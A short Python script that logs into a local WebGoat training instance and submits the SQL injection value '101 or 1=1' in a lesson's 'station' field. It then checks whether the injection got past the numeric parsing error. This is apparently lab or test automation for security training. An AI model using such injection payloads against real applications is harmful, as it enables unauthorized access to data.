import requests
import json

params = {}

params['username'] = "guest"
params['password'] = "guest"

r = requests.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check", data = params)

tempCookie = r.history[0].cookies['JSESSIONID']

#have to pass cookies as a dictionary
brownies = dict(JSESSIONID = tempCookie)

params = {}
params['station'] = "101 or 1=1"
params['SUBMIT'] = "Go!"


r = requests.get("http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc", cookies = brownies)
getJSON = list(r.json())
linkName = getJSON[10]["children"][1]["link"]

temp = "http://127.0.0.1:8080/WebGoat/" + linkName

r = requests.post(temp, cookies = brownies, data = params)

temp = r.text

print(not("Error parsing station as a number" in temp))




